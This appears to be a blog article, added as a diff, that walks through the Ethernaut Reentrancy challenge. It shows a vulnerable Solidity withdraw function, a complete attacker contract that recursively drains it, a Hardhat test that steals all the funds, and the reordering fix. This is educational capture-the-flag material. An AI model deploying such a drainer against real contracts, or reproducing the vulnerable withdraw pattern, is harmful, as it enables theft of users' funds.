@@ -1,0 +1,312 @@
+import { ArticleLayout } from "@/components/ArticleLayout";
+
+export const meta = {
+  author: "Bow Tied Hamachi",
+  date: "2022-12-14",
+  title: "Simulating a Reentrancy contract",
+  description:
+    "Using the Ethernaut Reentrancy Challenge to showcase what a reentrancy attack might look like",
+};
+
+export default (props) => <ArticleLayout meta={meta} {...props} />;
+
+## What is a Reentrancy Attack
+
+A Reentrancy attack recursively calls a smart contract multiple times in order to drain it of funds. Let's see an example below using the `Ethernaut` Challenge `Reentrancy` Contract.
+
+> All the code in this article can be found at https://github.com/bthamachi/Reentrance-Attack with a working hardhat config.
+>
+> Simply install the dependencies with npm install and then run the tests with npx hardhat test
+
+## Contract
+
+Here's the contract that we will be using in order to showcase how re-entrancy attacks work
+
+```sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import 'openzeppelin-contracts-06/math/SafeMath.sol';
+
+contract Reentrance {
+
+  using SafeMath for uint256;
+  mapping(address => uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+```
+
+Let's take a look at the `Withdraw` function in greater detail
+
+```
+function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+        (bool result,) = msg.sender.call{value:_amount}("");
+        if(result) {
+        _amount;
+        }
+        balances[msg.sender] -= _amount;
+    }
+}
+```
+
+The sequence of events is as follows
+
+1. The user indicates how much he wants to withdraw using the `_amount` variable.
+2. The contract checks to see if the user has enough funds in the contract to make this withdrawal. This is handled by the code snippet
+
+```sol
+balance[msg.sender] >= _amount
+```
+
+3. The contract then transfers the amount in `eth` to the user using the `call` function
+
+```sol
+(bool result,) = msg.sender.call{value:_amount}("");
+```
+
+4. Once this is succesful, we would then update the user's balance by running
+
+```
+balances[msg.sender] -= _amount;
+```
+
+Before we look into how this might happen, let's take a quick peek into how contracts can recieve `ETH`.
+
+## Contracts and ETH
+
+There are a few ways for contracts to recieve ETH
+
+1. Being forcibly sent eth using a `selfdestruct` opcode.
+
+This works in a relatively simple manner, if a contract is destroyed on-chain, the eth it holds and the gas that was used to create the contract is refunded. We can specify a destination for this in solidity using the `selfdestruct` function
+
+```
+selfdestruct(randomAddress)
+```
+
+2. Declaring a function with the `payable` parameter. If we indicate that a function is payable, then we can send eth in the same transaction to the contract when calling the function.
+
+```
+function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+```
+
+3. Using a `receive()` function.
+
+```
+receive() external payable {}
+```
+
+This function is executed when calls are made to the contract with no data. We can trigger this using a `sendTransaction()` call in hardhat. It must be declared as external and payable.
+
+## The exploit
+
+The exploit is simple, we create a malicious contract that makes a call to the `Re-entrance` contract to withdraw its maximum balance upon recieving eth. This then kickstarts another transfer call **while the original call is being suspended** and happens **before our balance in the contract is updated**. As a result, we can make multiple withdrawals, allowing us to withdraw significantly more than what we have stored in the contract.
+
+This can be done by modifying our `recieve()` function as seen below for our malicious contract as
+
+```
+receive() external payable {
+    if (startAttack) {
+        attackVictim.withdraw(attackAmount);
+    }
+}
+```
+
+I've used a `boolean` variable called `startAttack` here to indicate whether this piece of malicious code should be executed and `attackVictim` to refer to the `Reentrancy` Contract address. What this will essentially do is to call `.withdraw()` everytime it recieves ether, triggering a further `.call()` from the `Reentrancy` contract until we either run out of gas OR the contract runs out of funds.
+
+We can put this together in a malicious contract as
+
+```sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "@openzeppelin/contracts/math/SafeMath.sol";
+
+interface IReentrace {
+    function withdraw(uint _amount) external;
+
+    function balanceOf(address _who) external returns (uint256);
+
+    function donate(address _to) external payable;
+}
+
+contract ReentranceAttacker {
+    // No overflows
+    using SafeMath for uint256;
+    IReentrace attackVictim;
+    uint attackAmount;
+    bool startAttack;
+
+    constructor(address _attackVictim) public {
+        attackVictim = IReentrace(_attackVictim);
+    }
+
+    function fund() public payable {
+        attackVictim.donate{value: msg.value}(address(this));
+    }
+
+    function attack() public {
+        attackAmount = attackVictim.balanceOf(address(this));
+        startAttack = true;
+        attackVictim.withdraw(attackAmount);
+    }
+
+    receive() external payable {
+        if (startAttack) {
+            attackVictim.withdraw(attackAmount);
+        }
+    }
+}
+```
+
+I've added a few different things here - let's briefly go through them before simulating an attack locally using `hardhat`.
+
+1. `constructor(address _attackVictim)` : This is the function we're using to deploy the contract. In this instance, we pass in the address of the contract we want to drain. We also use an Interface `IReentrance` so that we can call the necessary functions.
+
+2. `fund()` : This bootstraps our malicious contract with some funds and deposits them in the `Reentrancy` contract.
+
+3. `attack()`: This kickstarts an attack on the `Reentrancy` contract. We do a few things here
+
+   - We find the current balance of our malicious contract in the target contract. This is important because this defines the maximum amount of money we can withdraw in a single transaction
+   - We then set `startAttack` to be true. This "turns on" the malicious code in our `recieve` function.
+
+## The Attack
+
+I've sketched out a quick graph to showcase how the attack can happen when we call the `attack()` function.
+
+<img
+  width="494"
+  alt="Screenshot 2022-12-14 at 12 32 58 PM"
+  src="https://user-images.githubusercontent.com/111180211/207506492-20a3dae8-41d1-4d39-ba5e-a269ced3c0f2.png"
+/>
+
+1. When we call the `attack` function, this sets off a `withdraw()` call to the malicious contract. Since we only call `withdraw()` with a valid balance, this will clear the input validation that is being used in the `Reentrancy` contract.
+
+2. This then sets off a `.call()` function invocation from the `Reentrancy` contract to our malicious contract without updating the balance of our contract in its internal state. Since we've now configured the `startAttack` variable to be true, this then sets off another `.withdraw()` call with the maximum amount.
+
+3. This cycle then repeats until we either (1) run out of gas or (2) the contract has no more funds to be withdrawn
+
+## Mocking it in Hardhat
+
+We can mock it in hardhat with the following script
+
+```
+import { expect } from "chai";
+import { ethers } from "hardhat";
+
+describe("Reentrancy", function () {
+  it("should be possible to get the target victim to assign a non-zero balance to our attacking contract and drain the contract's balance", async () => {
+    const [owner, hacker, otherAccount] = await ethers.getSigners();
+    const Reentrance = await ethers.getContractFactory("Reentrance");
+    const ReentranceAttacker = await ethers.getContractFactory(
+      "ReentranceAttacker"
+    );
+
+    const reentrance = await Reentrance.deploy();
+    const reentranceAddress = await reentrance.address;
+    const reentranceAttacker = await ReentranceAttacker.deploy(
+      reentranceAddress
+    );
+    // Owner funds with 1000 eth, our goal is to try and steal it all away
+    const originalfunds = 1000;
+    const honeypotfunds = 20;
+    await owner.sendTransaction({
+      to: reentranceAddress,
+      value: originalfunds,
+    });
+
+    const reentranceAttackerAddress = await reentranceAttacker.address;
+
+    reentranceAttacker.connect(hacker).fund({ value: honeypotfunds });
+
+    expect(await reentrance.balanceOf(reentranceAttackerAddress)).to.be.eq(
+      honeypotfunds
+    );
+
+    await reentranceAttacker.attack();
+
+    expect(
+      await hacker.provider?.getBalance(reentranceAttackerAddress)
+    ).to.be.eq(originalfunds + honeypotfunds);
+  });
+});
+```
+
+The script does the following things
+
+1. We first initialise some mock accounts and deploy the contracts that we've written
+
+```
+const [owner, hacker, otherAccount] = await ethers.getSigners();
+const Reentrance = await ethers.getContractFactory("Reentrance");
+const ReentranceAttacker = await ethers.getContractFactory(
+    "ReentranceAttacker"
+);
+```
+
+2. We then fund the `Reentrance` contract with 1000 eth using the owner account.
+
+```
+const originalfunds = 1000;
+const honeypotfunds = 20;
+await owner.sendTransaction({
+    to: reentranceAddress,
+    value: originalfunds,
+});
+```
+
+3. We then fund our attacker with some ETH so that we can have a non-zero balance in the `Reentrance` contract. We then validate this by using the `balanceOf` function provided by the `Reentrance` contract.
+
+```
+const reentranceAttackerAddress = await reentranceAttacker.address;
+
+reentranceAttacker.connect(hacker).fund({ value: honeypotfunds });
+
+expect(await reentrance.balanceOf(reentranceAttackerAddress)).to.be.eq(
+    honeypotfunds
+);
+```
+
+4. Lastly, we call the `.attack()` function from our `Reentrance Attacker` contract and verify that we've stolen all the funds. :)
+
+```
+await reentranceAttacker.attack();
+
+expect(
+    await hacker.provider?.getBalance(reentranceAttackerAddress)
+).to.be.eq(originalfunds + honeypotfunds);
+```
+
+## Preventing a Reentrance Attack
+
+We can solve our entire reentrance problem with just switching the order of the lines in the contract as seen below
+
+```
+if (balances[msg.sender] >= _amount) {
+balances[msg.sender] -= _amount;
+// we use call to withdraw
+(bool result, ) = msg.sender.call{value: _amount}("");
+}
+```
